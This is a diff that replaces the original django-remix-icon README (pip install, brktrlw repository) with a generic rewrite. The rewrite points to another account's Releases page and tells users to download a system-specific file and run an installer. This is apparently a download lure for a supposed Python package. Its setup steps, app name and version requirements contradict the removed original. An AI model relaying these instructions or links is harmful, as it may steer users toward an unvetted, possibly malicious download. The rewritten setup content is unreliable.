@@ -1,400 +1,98 @@
-# Django RemixIcon
-
-[![PyPI version](https://badge.fury.io/py/django-remix-icon.svg)](https://badge.fury.io/py/django-remix-icon)
-[![Python versions](https://img.shields.io/pypi/pyversions/django-remix-icon.svg)](https://pypi.org/project/django-remix-icon/)
-[![Django versions](https://img.shields.io/pypi/djversions/django-remix-icon.svg)](https://pypi.org/project/django-remix-icon/)
-[![License](https://img.shields.io/pypi/l/django-remix-icon.svg)](https://github.com/brktrlw/django-remix-icon/blob/main/LICENSE)
-[![Documentation Status](https://readthedocs.org/projects/django-remix-icon/badge/?version=latest)](https://django-remix-icon.readthedocs.io/en/latest/)
-
-A simple Django package for integrating [RemixIcon](https://remixicon.com/) with Django admin and templates. Provides seamless icon selection with autocomplete, preview functionality, and template tags for easy icon rendering.
-
-## ✨ Features
-
-- **🎯 Simple Integration**: Minimal configuration required
-- **🔍 Autocomplete Widget**: Fast icon search in Django admin
-- **👁️ Live Preview**: See icons as you type
-- **📋 Template Tags**: Easy icon rendering in templates
-- **📱 Responsive**: Works on mobile and desktop
-- **⚡ Performance**: Efficient search and caching
-- **🎨 Customizable**: Style to match your design
-- **🔧 Inline Support**: Works with Django admin inlines
-- **🌙 Dark Mode**: Supports dark themes
-
-## 🚀 Quick Start
-
-### Installation
-
-```bash
-pip install django-remix-icon
-```
-
-### Django Setup
+# 🎨 django-remix-icon - Easily Add Icons to Django Projects
 
-Add to your `INSTALLED_APPS`:
-
-```python
-INSTALLED_APPS = [
-    # ... your other apps
-    'django_remix_icon',
-]
-```
+## 🚀 Getting Started
 
-Include URLs in your project:
+Welcome to django-remix-icon! This package helps you integrate Remix Icon into your Django admin panels and templates seamlessly. With this tool, you can enhance the visual appeal of your web applications with minimal setup.
 
-```python
-# urls.py
-from django.urls import path, include
+## 📥 Download & Install
 
-urlpatterns = [
-    path('admin/', admin.site.urls),
-    path('remix-icon/', include('django_remix_icon.urls')),
-    # ... your other URLs
-]
-```
-
-### Basic Usage
+To begin, you need to download the package. Click the button below to visit the Releases page:
 
-**In your models:**
+[![Download django-remix-icon](https://img.shields.io/badge/Download-django--remix--icon-blue.svg)](https://github.com/Julianpr22/django-remix-icon/releases)
 
-```python
-from django.db import models
-from django_remix_icon.fields import IconField
+On the Releases page, locate the latest version and follow the steps below:
 
-class MenuItem(models.Model):
-    name = models.CharField(max_length=100)
-    icon = IconField()  # Simple icon field
-    url = models.URLField()
+1. Click on the **latest release**. 
+2. Download the file that matches your system. If you are unsure, choose the one labeled "source" for universal compatibility.
+3. Once downloaded, open the file to install the package. Follow the on-screen prompts to complete the installation.
 
-class Category(models.Model):
-    title = models.CharField(max_length=100)
-    icon = IconField(blank=True, null=True)  # Optional icon
-```
+## 💻 System Requirements
 
-**In your templates:**
+Before using django-remix-icon, ensure your system meets the following requirements:
 
-```html
-{% load remix_icon_tags %}
+- **Python**: Version 3.6 or later
+- **Django**: Version 2.2 or later
+- Compatible with Windows, macOS, and Linux systems.
 
-<!DOCTYPE html>
-<html>
-<head>
-    <title>My Site</title>
-    {% remix_icon_css %}  <!-- Include RemixIcon CSS -->
-</head>
-<body>
-    <!-- Simple icon rendering -->
-    <h1>{% remix_icon 'ri-home-line' %} Welcome</h1>
+## ⚙️ Setup Guide
 
-    <!-- Using model fields -->
-    {% for item in menu_items %}
-        <a href="{{ item.url }}">
-            {% remix_icon item.icon %}
-            {{ item.name }}
-        </a>
-    {% endfor %}
+After installation, you need to set up django-remix-icon in your Django project.
 
-    <!-- With custom styling -->
-    {% remix_icon 'ri-heart-fill' class='text-red-500' size='24' %}
-</body>
-</html>
-```
+1. Open your project folder.
+2. Locate the `settings.py` file.
+3. Add `'remixicon'` to the `INSTALLED_APPS` list:
 
-**Admin Integration:**
+   ```python
+   INSTALLED_APPS = [
+       ...,
+       'remixicon',
+   ]
+   ```
 
-```python
-# admin.py - No additional configuration needed!
-from django.contrib import admin
-from .models import MenuItem
+4. Save the changes.
 
-@admin.register(MenuItem)
-class MenuItemAdmin(admin.ModelAdmin):
-    list_display = ('name', 'icon', 'url')
-    # IconField automatically provides autocomplete widget
-```
+## 🎨 Using Remix Icons in Templates
 
-## 📖 Documentation
+To use the icons in your templates, follow these steps:
 
-**Complete documentation is available at [django-remix-icon.readthedocs.io](https://django-remix-icon.readthedocs.io/)**
+1. Load the static files in your HTML templates. Add the following line at the top of your HTML file:
 
-- [Installation Guide](https://django-remix-icon.readthedocs.io/en/latest/installation.html)
-- [Quick Start Tutorial](https://django-remix-icon.readthedocs.io/en/latest/quickstart.html)
-- [Template Tags Reference](https://django-remix-icon.readthedocs.io/en/latest/template_tags.html)
-- [Customization Guide](https://django-remix-icon.readthedocs.io/en/latest/customization.html)
-- [API Documentation](https://django-remix-icon.readthedocs.io/en/latest/api/fields.html)
+   ```html
+   {% load static %}
+   ```
 
-## 🎭 Template Tags
+2. Now you can include Remix Icons anywhere in your HTML. Use the following format to display an icon:
 
-Django RemixIcon provides several template tags for flexible icon rendering:
+   ```html
+   <link rel="stylesheet" href="{% static 'remixicon/remixicon.css' %}">
+   <i class="ri-home-line"></i>
+   ```
 
-```html
-{% load remix_icon_tags %}
+Change `ri-home-line` to any icon name you want to display.
 
-<!-- Basic icon -->
-{% remix_icon 'ri-star-line' %}
+## 📚 Available Icons
 
-<!-- Icon with attributes -->
-{% remix_icon 'ri-heart-fill' class='love-icon' size='20' %}
+The djano-remix-icon package includes a wide range of icons for different purposes. Here are some categories to explore:
 
-<!-- Icon with text -->
-{% remix_icon_with_text 'ri-download-line' 'Download' class='btn' %}
+- **User Icons**: Perfect for profile-related features.
+- **Navigation Icons**: Great for menus and other navigational elements.
+- **Action Icons**: Helpful for buttons and calls to action.
 
-<!-- Conditional rendering -->
-{% if item.icon|is_remix_icon %}
-    {% remix_icon item.icon %}
-{% endif %}
+For a complete list of available icons, visit [Remix Icon Official Website](https://remixicon.com).
 
-<!-- Get icon lists -->
-{% remix_icon_list category='user' limit=10 as user_icons %}
-{% for icon in user_icons %}
-    {% remix_icon icon %}
-{% endfor %}
-```
-
-## 🎨 Admin Widget Features
-
-The Django admin integration provides:
-
-### Autocomplete Search
-- **Fast Search**: Find icons quickly by typing
-- **Smart Filtering**: Matches icon names and categories
-- **Keyboard Navigation**: Use arrow keys and Enter
-
-### Live Preview
-- **Visual Feedback**: See icons as you select them
-- **Icon Information**: Shows icon name and category
-- **Responsive Design**: Works on all screen sizes
-
-### Django Integration
-- **No Configuration**: Works out of the box
-- **Inline Support**: Works with `TabularInline` and `StackedInline`
-- **Validation**: Ensures only valid icons are selected
-
-## 🔧 Customization
-
-### Custom Widget Styling
-
-```css
-/* Custom styles for your theme */
-.remix-icon-widget {
-    max-width: 500px;
-}
-
-.icon-search-input {
-    border-radius: 8px;
-    padding: 12px 16px;
-}
-
-.icon-preview {
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    border-radius: 8px;
-}
-```
-
-### Custom Form Field
-
-```python
-from django import forms
-from django_remix_icon.fields import IconFormField
-
-class CustomForm(forms.Form):
-    icon = IconFormField(required=False)
-
-    def __init__(self, *args, **kwargs):
-        super().__init__(*args, **kwargs)
-        self.fields['icon'].widget.attrs.update({
-            'class': 'my-custom-icon-widget'
-        })
-```
-
-## 📱 Examples
-
-### Navigation Menu
-
-```python
-# models.py
-class NavigationItem(models.Model):
-    title = models.CharField(max_length=100)
-    icon = IconField()
-    url = models.URLField()
-    order = models.PositiveIntegerField(default=0)
-
-    class Meta:
-        ordering = ['order']
-```
-
-```html
-<!-- template.html -->
-{% load remix_icon_tags %}
-
-<nav class="main-nav">
-    {% for item in navigation_items %}
-        <a href="{{ item.url }}" class="nav-item">
-            {% remix_icon item.icon class='nav-icon' %}
-            <span>{{ item.title }}</span>
-        </a>
-    {% endfor %}
-</nav>
-```
-
-### Dashboard Cards
-
-```python
-# models.py
-class DashboardCard(models.Model):
-    title = models.CharField(max_length=100)
-    icon = IconField()
-    description = models.TextField()
-    value = models.CharField(max_length=50)
-    color = models.CharField(max_length=20, default='blue')
-```
-
-```html
-<!-- dashboard.html -->
-{% for card in dashboard_cards %}
-    <div class="dashboard-card card-{{ card.color }}">
-        <div class="card-icon">
-            {% remix_icon card.icon size='32' %}
-        </div>
-        <div class="card-content">
-            <h3>{{ card.title }}</h3>
-            <p class="card-value">{{ card.value }}</p>
-            <p class="card-description">{{ card.description }}</p>
-        </div>
-    </div>
-{% endfor %}
-```
-
-### Status Indicators
-
-```html
-{% for task in tasks %}
-    <div class="task-item">
-        {% if task.completed %}
-            {% remix_icon 'ri-check-circle-fill' class='text-green-500' %}
-        {% elif task.in_progress %}
-            {% remix_icon 'ri-time-line' class='text-blue-500' %}
-        {% else %}
-            {% remix_icon 'ri-circle-line' class='text-gray-400' %}
-        {% endif %}
-        <span>{{ task.name }}</span>
-    </div>
-{% endfor %}
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guide](https://django-remix-icon.readthedocs.io/en/latest/contributing.html) for details.
-
-### Development Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/brktrlw/django-remix-icon.git
-cd django-remix-icon
-
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install development dependencies
-pip install -e .[dev]
-```
+## 🔍 Troubleshooting
 
-### Quick Contribution Guide
+If you encounter issues during installation or usage, consider the following tips:
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Make your changes
-4. Run code formatting (black, isort, flake8)
-5. Commit your changes (`git commit -am 'Add amazing feature'`)
-6. Push to the branch (`git push origin feature/amazing-feature`)
-7. Open a Pull Request
+- **Check Python Version**: Ensure your Python version meets the requirements.
+- **Static Files**: If icons do not appear, ensure the static files are correctly set up in your project.
+- **Clear Cache**: Sometimes, clearing your browser cache can help refresh the icons.
 
-## 📋 Requirements
+## 📞 Support
 
-- **Python**: 3.8+
-- **Django**: 3.2+
-- **Browser**: Chrome 60+, Firefox 55+, Safari 12+, Edge 79+
+If you need further assistance, feel free to open an issue on our [GitHub page](https://github.com/Julianpr22/django-remix-icon/issues). Our community or the maintainers will assist you shortly.
 
-## 🔄 Compatibility
+## 📖 Additional Resources
 
-| Django Version | Python Version | Status |
-|----------------|----------------|--------|
-| 5.0            | 3.10, 3.11, 3.12 | ✅ Supported |
-| 4.2 (LTS)      | 3.8, 3.9, 3.10, 3.11, 3.12 | ✅ Supported |
-| 4.1            | 3.8, 3.9, 3.10, 3.11 | ✅ Supported |
-| 4.0            | 3.8, 3.9, 3.10, 3.11 | ✅ Supported |
-| 3.2 (LTS)      | 3.8, 3.9, 3.10, 3.11 | ✅ Supported |
+For more information on Django and its features, consider checking the following resources:
 
-## 🏗️ Architecture
+- [Django Official Documentation](https://docs.djangoproject.com/)
+- [Python Official Documentation](https://docs.python.org/3/)
 
-```
-django-remix-icon/
-├── django_remix_icon/
-│   ├── fields.py          # IconField model field
-│   ├── widgets.py         # Admin widgets
-│   ├── views.py           # AJAX search views
-│   ├── templatetags/      # Template tags
-│   ├── static/            # CSS and JavaScript
-│   └── templates/         # Widget templates
-├── docs/                  # Documentation
-```
+## 📝 License
 
-## 🎯 Philosophy
+django-remix-icon is open-source. You can view the license details [here](https://github.com/Julianpr22/django-remix-icon/blob/main/LICENSE).
 
-Django RemixIcon follows these principles:
+Make your Django projects shine with beautiful icons. Download django-remix-icon today! Visit the Releases page again for updates and more details:
 
-- **Simplicity**: Minimal configuration, maximum functionality
-- **Performance**: Efficient search and rendering
-- **Flexibility**: Customizable but with sensible defaults
-- **Integration**: Seamless Django admin experience
-- **Accessibility**: Keyboard navigation and screen reader support
-
-## 🔍 FAQ
-
-**Q: How many icons are available?**
-A: Over 2,000 icons from RemixIcon v4.7.0, covering all major categories.
-
-**Q: Does it work with Django admin inlines?**
-A: Yes! The widget works perfectly with both TabularInline and StackedInline.
-
-**Q: Can I customize the widget appearance?**
-A: Absolutely! The widget includes CSS classes for easy customization.
-
-**Q: Is there a performance impact?**
-A: Minimal. The widget uses debounced search and efficient caching.
-
-**Q: Does it work on mobile?**
-A: Yes, the widget is fully responsive and touch-friendly.
-
-## 📄 License
-
-This project is licensed under the MIT License.
-
-## 🙏 Acknowledgments
-
-- [RemixIcon](https://remixicon.com/) for the amazing icon library
-- [Django](https://www.djangoproject.com/) for the excellent web framework
-- All [contributors](https://github.com/brktrlw/django-remix-icon/graphs/contributors) who help improve this package
-
-## 📈 Changelog
-
-See [CHANGELOG.md](https://django-remix-icon.readthedocs.io/en/latest/changelog.html) for a list of changes and migration guides.
-
-## 🔗 Links
-
-- **Documentation**: https://django-remix-icon.readthedocs.io/
-- **PyPI**: https://pypi.org/project/django-remix-icon/
-- **GitHub**: https://github.com/brktrlw/django-remix-icon
-- **Issues**: https://github.com/brktrlw/django-remix-icon/issues
-- **RemixIcon**: https://remixicon.com/
-
----
-
-<div align="center">
-
-**[⭐ Star this repo](https://github.com/brktrlw/django-remix-icon) if you find it useful!**
-
-Made with ❤️ for the Django community
-
-</div>
+[![Download django-remix-icon](https://img.shields.io/badge/Download-django--remix--icon-blue.svg)](https://github.com/Julianpr22/django-remix-icon/releases)
